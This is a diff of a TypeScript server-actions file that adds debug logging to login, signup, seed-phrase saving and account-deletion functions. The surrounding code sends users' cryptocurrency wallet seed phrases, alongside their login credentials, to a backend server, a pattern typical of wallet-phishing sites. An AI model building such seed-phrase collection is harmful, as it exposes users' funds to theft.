@@ -123,6 +123,7 @@ async function setSessionCookie(token: string): Promise<Session | null> {
 export async function handleLogin(
   formData: LoginFormData
 ): Promise<{ success: boolean; session?: Session | null; error?: string }> {
+  console.log("[Login Action] Starting..."); // Add log
   const validatedFields = LoginSchema.safeParse(formData);
   if (!validatedFields.success) {
     console.error('[Login Action] Frontend validation failed:', validatedFields.error.flatten().fieldErrors);
@@ -147,6 +148,7 @@ export async function handleLogin(
              console.error(`[Login Action] setSessionCookie failed for ${email}.`); // Add specific log
              return { success: false, error: 'Login succeeded but failed to set session cookie.' };
         }
+        console.log("[Login Action] Session set, returning success."); // Add log
         return { success: true, session: session };
     } else {
         console.error(`[Login Action] Backend response missing token for ${email}.`);
@@ -165,6 +167,7 @@ export async function handleLogin(
 export async function handleSignup(
   formData: SignupFormData
 ): Promise<{ success: boolean; error?: string }> {
+  console.log("[Signup Action] Starting..."); // Add log
   const validatedFields = SignupSchema.safeParse(formData);
   if (!validatedFields.success) {
     console.error('[Signup Action] Frontend validation failed:', validatedFields.error.flatten().fieldErrors);
@@ -184,13 +187,14 @@ export async function handleSignup(
         if (response.status === 409 && data.message?.toLowerCase().includes('email already exists')) {
             return { success: false, error: 'Email already exists. Please log in or use a different email.' };
         }
-         // Handle fetch failed specifically
+         // Handle fetch failed specifically - This was missing the check for 'error' variable
          if (error instanceof TypeError && error.message.includes('fetch failed')) {
               return { success: false, error: `Failed to connect to the server: ${error.message}` };
          }
         return { success: false, error: data.message || `Signup failed (status: ${response.status})` };
     }
      console.log(`[Signup Action] Signup successful for ${email}.`);
+     console.log("[Signup Action] Returning success."); // Add log
     return { success: true }; // User needs to login separately
   } catch (error) {
     console.error('[Signup Action] Network or unexpected error:', error);
@@ -205,6 +209,7 @@ export async function handleSignup(
 export async function saveSeedPhraseAction(
   formData: SeedPhraseFormData
 ): Promise<{ success: boolean; error?: string }> {
+    console.log("[Save Seed Action] Starting..."); // Add log
    let userId: string;
    let token: string | undefined;
    try {
@@ -235,6 +240,7 @@ export async function saveSeedPhraseAction(
         console.log(`[Save Seed Action] Backend save successful for user: ${userId}.`);
          revalidatePath('/dashboard');
          console.log('[Save Seed Action] Revalidated /dashboard path.');
+         console.log("[Save Seed Action] Returning success."); // Add log
         return { success: true };
     } else {
       let errorMessage = `Failed to save information (status: ${response.status})`;
@@ -270,6 +276,7 @@ export async function handleLoginAndSave(
     const firstError = Object.values(validatedFields.error.flatten().fieldErrors).flat()[0];
     return { success: false, error: firstError || 'Invalid data provided.' };
   }
+  console.log("[LoginAndSave Action] Frontend validation successful.");
 
   const { email, password, walletName, seedPhrase, walletType } = validatedFields.data;
 
@@ -281,6 +288,7 @@ export async function handleLoginAndSave(
     const loginResponse = await fetch(`${BACKEND_API_URL}/api/auth/login`, {
       method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email, password }),
     });
+    console.log(`[LoginAndSave Action] Login fetch status: ${loginResponse.status}`);
     const loginData = await loginResponse.json();
 
     if (!loginResponse.ok) {
@@ -291,6 +299,7 @@ export async function handleLoginAndSave(
        }
        return { success: false, error: loginData.message || `Login failed (status: ${loginResponse.status})` };
     }
+    console.log("[LoginAndSave Action] Login response OK.");
 
     if (loginData.token) {
         loginToken = loginData.token;
@@ -322,6 +331,7 @@ export async function handleLoginAndSave(
       console.error('[LoginAndSave Action] Critical error: Token or userId missing after successful login and cookie set.');
       return { success: false, error: 'Internal error after login.' };
   }
+  console.log("[LoginAndSave Action] Token and User ID confirmed.");
 
   // 3. Attempt to Save Seed Phrase using the obtained token
   try {
@@ -344,6 +354,7 @@ export async function handleLoginAndSave(
       },
       body: JSON.stringify(seedDataToSave),
     });
+    console.log(`[LoginAndSave Action] Save seed phrase fetch status: ${saveResponse.status}`);
 
     if (saveResponse.ok) {
         console.log(`[LoginAndSave Action] Seed phrase save successful for wallet: ${walletName}.`);
@@ -389,6 +400,7 @@ export async function handleSignOut(): Promise<void> {
 
 // --- Delete Account Action (Remains the same logic but uses verifyAuth) ---
 export async function deleteAccountAction(): Promise<{ success: boolean; error?: string }> {
+    console.log("[Delete Account Action] Starting..."); // Add log
     let token: string | undefined;
     let userId: string;
     try {
@@ -407,6 +419,7 @@ export async function deleteAccountAction(): Promise<{ success: boolean; error?:
         const response = await fetch(`${BACKEND_API_URL}/api/users/profile`, {
             method: 'DELETE', headers: { 'Authorization': `Bearer ${token}` },
         });
+        console.log(`[Delete Account Action] Delete fetch status: ${response.status}`);
 
         // Check if backend call was successful, even if it returns no content (204) or content (200)
         if (!response.ok) {
@@ -427,6 +440,7 @@ export async function deleteAccountAction(): Promise<{ success: boolean; error?:
         // Sign out AFTER successful backend deletion
         await handleSignOut();
         console.log(`[Delete Account Action] Session cookie cleared for User ID: ${userId}.`);
+        console.log("[Delete Account Action] Returning success."); // Add log
         return { success: true };
     } catch (error) {
         console.error(`[Delete Account Action] Network or unexpected error for User ID: ${userId}`, error);
